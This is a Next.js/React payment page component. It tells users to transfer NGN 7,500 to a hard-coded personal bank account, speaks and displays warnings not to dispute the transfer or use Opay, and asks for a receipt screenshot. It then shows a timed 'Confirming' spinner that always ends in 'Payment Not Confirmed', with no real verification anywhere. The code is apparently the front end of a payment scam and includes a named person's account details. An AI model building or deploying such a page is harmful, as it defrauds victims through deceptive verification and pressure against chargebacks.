"use client"

import { useEffect, useState } from "react"
import { useRouter } from "next/navigation"
import { ChevronLeft, Copy } from "lucide-react"

type PageState = "processing" | "instructions" | "payment" | "confirming" | "notConfirmed"

export default function PaymentPage() {
  const router = useRouter()
  const [pageState, setPageState] = useState<PageState>("processing")
  const [uploadedFile, setUploadedFile] = useState<File | null>(null)
  const [previewUrl, setPreviewUrl] = useState<string | null>(null)
  const [copied, setCopied] = useState(false)
  const [agreedToInstructions, setAgreedToInstructions] = useState(false)
  const [isSpeaking, setIsSpeaking] = useState(false)

  const bankDetails = {
    accountName: "ADENIYI BANJOKO",
    accountNumber: "2270949199",
    bankName: "PAGA BANK AGENT",
    fee: "7,500",
  }

  // Initial processing screen for 5 seconds, then show instructions
  useEffect(() => {
    const timer = setTimeout(() => {
      setPageState("instructions")
    }, 5000)
    return () => clearTimeout(timer)
  }, [])

  // Auto-play voice instructions when modal appears
  useEffect(() => {
    if (pageState === "instructions") {
      speakInstructions()
    }
  }, [pageState])

  const speakInstructions = () => {
    const text = "Before you make this transfer. Transfer only the exact amount. Do not transfer an incorrect amount. Do not dispute any transactions made to our account. It can cause restrictions and other impacts. Avoid using Opay bank for your payment. This can lead to delays in verifying your payment."
    
    if ("speechSynthesis" in window) {
      setIsSpeaking(true)
      const utterance = new SpeechSynthesisUtterance(text)
      utterance.rate = 0.9
      utterance.pitch = 1
      utterance.volume = 1
      utterance.onend = () => setIsSpeaking(false)
      window.speechSynthesis.cancel()
      window.speechSynthesis.speak(utterance)
    }
  }

  const handleCopyAccountNumber = () => {
    navigator.clipboard.writeText(bankDetails.accountNumber)
    setCopied(true)
    setTimeout(() => setCopied(false), 2000)
  }

  const handleFileUpload = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0]
    if (file) {
      setUploadedFile(file)
      const reader = new FileReader()
      reader.onload = (event) => {
        setPreviewUrl(event.target?.result as string)
      }
      reader.readAsDataURL(file)
    }
  }

  const handlePaymentConfirm = () => {
    setPageState("confirming")
    // 6-second loading for confirmation
    setTimeout(() => {
      setPageState("notConfirmed")
    }, 6000)
  }

  // Processing Screen
  if (pageState === "processing") {
    return (
      <div className="min-h-screen bg-[#e8f5ec] flex items-center justify-center p-4">
        <div className="bg-white rounded-3xl p-8 max-w-md w-full text-center space-y-6 border border-[#d0e8dc]">
          <div className="flex justify-center">
            <div className="w-20 h-20 border-4 border-[#e8f5ec] border-t-[#1a9b5c] rounded-full animate-spin"></div>
          </div>
          <h2 className="text-3xl font-bold text-[#1a7a4d]">Processing...</h2>
          <p className="text-[#1a9b5c] text-lg">Preparing payment account details</p>
        </div>
      </div>
    )
  }

  // Instructions Modal
  if (pageState === "instructions") {
    return (
      <div className="min-h-screen bg-black/50 flex items-center justify-center p-4 fixed inset-0 z-50">
        <div className="bg-white rounded-3xl p-8 max-w-md w-full space-y-6 max-h-[90vh] overflow-y-auto">
          {/* Close Button */}
          <div className="flex justify-end">
            <button
              onClick={() => setPageState("payment")}
              className="text-gray-600 hover:text-gray-900 text-2xl"
            >
              ✕
            </button>
          </div>

          {/* Icon */}
          <div className="flex justify-center">
            <div className="w-20 h-20 rounded-full bg-[#e8f5ec] flex items-center justify-center text-4xl">
              💰
            </div>
          </div>

          {/* Title and Amount */}
          <div className="text-center space-y-2">
            <h2 className="text-3xl font-bold text-gray-900">Pay NGN 7,500.00</h2>
            <p className="text-gray-600">Before you make this transfer</p>
          </div>

          {/* Instructions List */}
          <div className="space-y-4">
            <div className="flex gap-3">
              <div className="text-[#1a9b5c] text-xl mt-1">✓</div>
              <div>
                <p className="font-bold text-orange-600">Transfer only the exact amount</p>
                <p className="text-gray-600 text-sm">Do not transfer an incorrect amount.</p>
              </div>
            </div>

            <div className="flex gap-3">
              <div className="text-[#1a9b5c] text-xl mt-1">✓</div>
              <div>
                <p className="font-bold text-orange-600">Do not dispute any transactions made to our account</p>
                <p className="text-gray-600 text-sm">It can cause restrictions and other impacts.</p>
              </div>
            </div>

            <div className="flex gap-3">
              <div className="text-[#1a9b5c] text-xl mt-1">✓</div>
              <div>
                <p className="font-bold text-orange-600">Avoid using Opay bank for your payment</p>
                <p className="text-gray-600 text-sm">This can lead to delays in verifying your payment.</p>
              </div>
            </div>
          </div>

          {/* Checkbox */}
          <label className="flex items-center gap-3 p-3 bg-blue-50 rounded-lg cursor-pointer">
            <input
              type="checkbox"
              checked={agreedToInstructions}
              onChange={(e) => setAgreedToInstructions(e.target.checked)}
              className="w-5 h-5 accent-blue-600"
            />
            <span className="text-gray-900 font-medium">I understand these instructions.</span>
          </label>

          {/* Voice Button */}
          <button
            onClick={() => {
              window.speechSynthesis.cancel()
              speakInstructions()
            }}
            className="w-full py-2 border border-[#1a9b5c] text-[#1a9b5c] font-semibold rounded-lg hover:bg-[#f0f9f5] transition-colors"
          >
            🔊 {isSpeaking ? "Playing..." : "Replay Instructions"}
          </button>

          {/* Continue Button */}
          <button
            onClick={() => setPageState("payment")}
            disabled={!agreedToInstructions}
            className="w-full py-3 bg-gradient-to-r from-[#0a8f3d] to-[#1a9b5c] hover:from-[#097233] hover:to-[#168a4f] disabled:opacity-50 disabled:cursor-not-allowed text-white font-bold rounded-lg transition-all"
          >
            Continue Payment
          </button>
        </div>
      </div>
    )
  }

  // Payment Screen
  if (pageState === "payment") {
    return (
      <div className="min-h-screen bg-[#e8f5ec]">
        <div className="bg-gradient-to-r from-[#0a8f3d] to-[#1a9b5c] text-white p-6 flex items-center gap-4">
          <button onClick={() => router.back()} className="hover:opacity-80">
            <ChevronLeft className="w-6 h-6" />
          </button>
          <h1 className="text-2xl font-bold">Make Payment</h1>
        </div>

        <div className="p-6">
          <div className="max-w-md mx-auto">
            <div className="bg-white rounded-3xl p-8 space-y-8 border border-[#d0e8dc]">
              {/* Icon and Title */}
              <div className="text-center space-y-4">
                <div className="flex justify-center">
                  <div className="w-20 h-20 rounded-full bg-[#e8f5ec] flex items-center justify-center">
                    <div className="w-12 h-12 rounded-lg bg-[#1a9b5c] flex items-center justify-center text-white text-2xl">
                      —
                    </div>
                  </div>
                </div>
                <h2 className="text-3xl font-bold text-[#1a7a4d]">Make Payment</h2>
                <p className="text-[#1a9b5c] text-base">Transfer to the account below</p>
              </div>

              {/* Account Details */}
              <div className="space-y-6">
                {/* Account Number */}
                <div className="bg-[#f0f9f5] rounded-lg p-4">
                  <p className="text-gray-700 text-sm mb-2">Account Number</p>
                  <div className="flex items-center justify-between">
                    <p className="text-gray-900 font-bold text-lg">{bankDetails.accountNumber}</p>
                    <button
                      onClick={handleCopyAccountNumber}
                      className="text-[#1a9b5c] hover:opacity-80 transition-opacity"
                      title="Copy account number"
                    >
                      <Copy className="w-5 h-5" />
                    </button>
                  </div>
                  {copied && <p className="text-[#1a9b5c] text-xs mt-2">Copied!</p>}
                </div>

                {/* Bank */}
                <div className="bg-[#f0f9f5] rounded-lg p-4">
                  <p className="text-gray-700 text-sm mb-2">Bank</p>
                  <p className="text-gray-900 font-bold text-lg">{bankDetails.bankName}</p>
                </div>

                {/* Account Name */}
                <div className="bg-[#f0f9f5] rounded-lg p-4">
                  <p className="text-gray-700 text-sm mb-2">Account Name</p>
                  <p className="text-gray-900 font-bold text-lg">{bankDetails.accountName}</p>
                </div>

                {/* Fee */}
                <div className="border border-[#1a9b5c] rounded-lg p-4">
                  <p className="text-gray-700 text-sm mb-2">Fee</p>
                  <p className="text-[#1a9b5c] font-bold text-2xl">₦{bankDetails.fee}</p>
                </div>
              </div>

              {/* Upload Section */}
              <div className="space-y-4 border-2 border-dashed border-[#1a9b5c] rounded-lg p-6">
                <div className="flex items-center gap-3">
                  <span className="text-[#1a9b5c] text-2xl">📸</span>
                  <p className="text-[#1a7a4d] font-semibold">Upload payment screenshot <span className="text-red-500">*</span></p>
                </div>
                
                {previewUrl ? (
                  <div className="space-y-2">
                    <img src={previewUrl} alt="Payment receipt" className="w-full rounded-lg border border-[#1a9b5c]" />
                    <p className="text-[#1a9b5c] text-sm font-medium">✓ {uploadedFile?.name}</p>
                  </div>
                ) : (
                  <label className="block">
                    <div className="border border-[#1a9b5c] rounded-lg py-4 px-6 text-center bg-[#f0f9f5] cursor-pointer hover:bg-[#e0f2e9] transition-colors">
                      <p className="text-[#1a9b5c] font-semibold">⬆ Choose image</p>
                    </div>
                    <input
                      type="file"
                      accept="image/*"
                      onChange={handleFileUpload}
                      className="hidden"
                    />
                  </label>
                )}
                
                <p className="text-gray-600 text-xs">Upload: your payment receipt for fast verification.</p>
              </div>

              {/* Submit Button */}
              <button
                onClick={handlePaymentConfirm}
                disabled={!previewUrl}
                className="w-full py-4 bg-gradient-to-r from-[#0a8f3d] to-[#1a9b5c] hover:from-[#097233] hover:to-[#168a4f] disabled:opacity-50 text-white font-bold rounded-full text-base transition-all"
              >
                I have paid
              </button>
            </div>
          </div>
        </div>

        <button className="fixed right-5 bottom-6 w-14 h-14 rounded-full bg-[#0a8f3d] text-white flex items-center justify-center hover:scale-110 transition-transform z-40 text-xl">
          💬
        </button>
      </div>
    )
  }

  // Confirming Screen
  if (pageState === "confirming") {
    return (
      <div className="min-h-screen bg-[#e8f5ec] flex items-center justify-center p-4">
        <div className="bg-white rounded-3xl p-8 max-w-md w-full text-center space-y-6 border border-[#d0e8dc]">
          <div className="flex justify-center">
            <div className="w-20 h-20 border-4 border-[#e8f5ec] border-t-[#1a9b5c] rounded-full animate-spin"></div>
          </div>
          <h2 className="text-3xl font-bold text-[#1a7a4d]">Confirming...</h2>
          <p className="text-[#1a9b5c] text-lg">Confirming your payment please wait...</p>
        </div>
      </div>
    )
  }

  // Payment Not Confirmed Screen
  if (pageState === "notConfirmed") {
    return (
      <div className="min-h-screen bg-[#f5f6f7]">
        <div className="bg-red-600 text-white p-6 flex items-center gap-4">
          <button onClick={() => router.back()} className="hover:opacity-80">
            <ChevronLeft className="w-6 h-6" />
          </button>
          <h1 className="text-2xl font-bold">Payment Status</h1>
        </div>

        <div className="p-6 flex items-center justify-center min-h-[calc(100vh-100px)]">
          <div className="max-w-md w-full bg-white rounded-3xl p-8 text-center space-y-6 border border-red-200">
            <div className="flex justify-center">
              <div className="w-20 h-20 rounded-full border-4 border-red-500 flex items-center justify-center">
                <span className="text-red-500 text-4xl">!</span>
              </div>
            </div>
            
            <div>
              <h2 className="text-3xl font-bold text-red-600 mb-3">Payment Not Confirmed</h2>
              <p className="text-gray-700 text-base leading-relaxed">
                Payment not confirmed. Please don&apos;t dispute any transfer to us. Contact support instead.
              </p>
            </div>

            <button
              onClick={() => router.back()}
              className="py-3 px-8 border-2 border-red-600 text-red-600 font-bold rounded-lg hover:bg-red-50 transition-colors"
            >
              Go Back
            </button>
          </div>
        </div>

        <button className="fixed right-5 bottom-6 w-14 h-14 rounded-full bg-red-600 text-white flex items-center justify-center hover:scale-110 transition-transform z-40 text-xl">
          💬
        </button>
      </div>
    )
  }
}
